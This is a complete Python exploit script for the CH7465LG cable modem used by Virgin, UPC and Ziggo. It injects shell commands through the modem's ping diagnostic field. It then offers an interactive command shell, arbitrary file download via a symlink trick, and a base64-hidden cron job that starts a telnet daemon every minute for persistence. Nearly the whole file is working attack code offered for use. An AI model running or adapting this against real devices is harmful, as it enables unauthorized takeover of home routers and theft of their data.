#!/usr/bin/env python2.7
#
# Exploit for CH7465LG cable modem.
# as distributed by virgin, upc, ziggo
#
# Tested on
# Hardware version: 5.01
# Software version: CH7465LG-NCIP-6.12.18.25-2p5-NOSH
#
# know issues:
# Doesn't work when user is logged in on webpannel of the modem.
############################################################################
import requests
import urllib
import time

debug = False
target = "192.168.178.1"
pause = 1                 #the time inbetween sending the command and retreiving the output
proxies = {}
error_msg = 'Well, that did not work.\n\nYour on your own now,\nGOOD LUCK!!'

# Order of the data is important, this is why its done like this, and not with a data dict
payload_template = 'token=XXTOKENXX&fun=126&Type=1&Target_IP=XXPAYLOADXX&Ping_Size=1&Num_Ping=1&Ping_Interval=1'

############################################################################

def print_msg(msg):
	print '\033[1;30;40m'+msg+'\033[1;37;40m\n'

############################################################################

if debug:
	import logging
	import httplib
	proxies = {"http": "http://127.0.0.1:8080","https": "http://127.0.0.1:8080"}
	httplib.HTTPConnection.debuglevel = 1
	logging.basicConfig()
	logging.getLogger().setLevel(logging.DEBUG)
	req_log = logging.getLogger('requests.packages.urllib3')
	req_log.setLevel(logging.DEBUG)
	req_log.propagate = True

############################################################################

# session for cookies n shit.
s = requests.Session()

# get our first token
print_msg("Fetching a token")
r = s.get('http://'+target+'/common_page/login.html' ,proxies=proxies)
token=r.cookies['sessionToken']
r = s.get('http://'+target+'/xml/setter.xml',data='token='+token+'&fun=1' ,proxies=proxies)
token=r.cookies['sessionToken']

##########################################################################

def send_payload(p,token):
	payload=payload_template.replace('XXTOKENXX',token).replace('XXPAYLOADXX',p)
	print_msg('payload to be send : '+payload)
	print_msg('payload length : '+str(len(payload)))
	r = s.post('http://'+target+'/xml/setter.xml' ,data=payload, proxies=proxies ,allow_redirects = False)
	token=r.cookies['sessionToken']
	if r.status_code != 200:
		print error_msg
	time.sleep(pause)
	return token

############################################################################

def get_result():
	print_msg('getting data')
	r = s.get('http://'+target+'/css/style.css', proxies=proxies, allow_redirects=False)
	if r.status_code != 200:
		print error_msg
	return r.content

############################################################################

def download_file(path,token):
	token = send_payload('$(rm /var/tmp/www/style.css)',token)  #file or symlink
	token = send_payload('$(ln -s '+path+' /var/tmp/www/style.css)',token)
	result = get_result()
	if len(result) == 0:
		print_msg('file is 0 bytes')
	filename = path.replace('_','..').replace('/','_')
	#filename = path.split('/')[-1]
	file = open(filename,'w')
	file.write(result)
	file.close()
	print 'file saved to : ./'+filename
	token = send_payload('$(rm /var/tmp/www/style.css)',token) #remove symlinks
	return token

############################################################################
# adds * * * * * bash /var/tmp/run.sh & # to. cron tab.
# and
# after this you can just pipe shit to /var/tmp/run.sh if you want to run it every minute.
#
def cron_telnetd(t):
	command_list=[
		'echo utelnetd >/var/tmp/run.sh',
		'crontab -l > /var/tmp/cron',
		'echo KiAqICogKiAqIGJhc2ggL3Zhci90bXAvcnVuLnNoICYgIw==|base64 -d >> /var/tmp/cron',
		'crontab /var/tmp/cron']
	for x in command_list:
		t=send_payload('$('+x+')' ,t)
	return t

############################################################################

def get_tokens(token):
	f = open('tokens','w+')
	tokens=[]
	for i in range(0,1000):
		token = send_payload('$(ls)' ,token)
		tokens.append(token)
		f.write(token+'\n')
	for x in tokens:
		print x

# dont worry this is not accualy a file, It's a symlink.
token = send_payload('$(rm /var/tmp/www/style.css)',token)
print_msg('Testing, if we can write')
token = send_payload('$(echo WriteTest > /var/tmp/www/style.css)',token)

# Check if we can accualy write there.
if 'WriteTest' not in get_result():
	print error_msg
	exit()

print_msg("Test write sucessfull")


# loop for a half assed shell
# make sure you only run commands that will end otherwise
# the web server will hang or crash and the modem needs to be rebooted.
# always use full paths
#
# <cmd>          run a command and return result
# r <cmd>        run a command, don't return the result
# d <path>       download file
# t              make cronjob t0 start telnet deamon evey minute
# g              get 100 tokens
# q              to quit

while 1:
	i = raw_input('>').replace('\n','')
	if i == 'q':
		print 'restoring symlink'
		token = send_payload('$(rm /var/tmp/www/style.css)',token)
		send_payload('$(ln -s /fss/gw/www/multi_css/Ziggo-style.css /var/tmp/www/style.css)', token)
		exit()
	elif i[:2] == 'd ':
		token=download_file(i[2:] ,token)
	elif i[:2] == 'r ':
		token=send_payload('$('+i[2:]+')' ,token)
	elif i == 't':
		cron_telnetd(token)
	elif i == 'g':
		get_tokens(token)
	else:
		token = send_payload('$('+i+' > /var/tmp/www/style.css)',token)
		print get_result()

############################################################################
#
#           - - -- ---====--===--==.
#      _|_                          \
#       |    Dedicated to Ernst      \
#       |      Rest in peace          |
#       |  You were a great friend    |
#                 and lover.          |
#                             ('.')   |
#       You will be missed     \ /    |
#      .---- --- --   -    -    '     |
#        It's not always easy         |
#      '  being a colorfull person    |
#       \  In world that seems        |
#        \   black and white .        /
#         \                          /
#          '----------=======--==-=-'
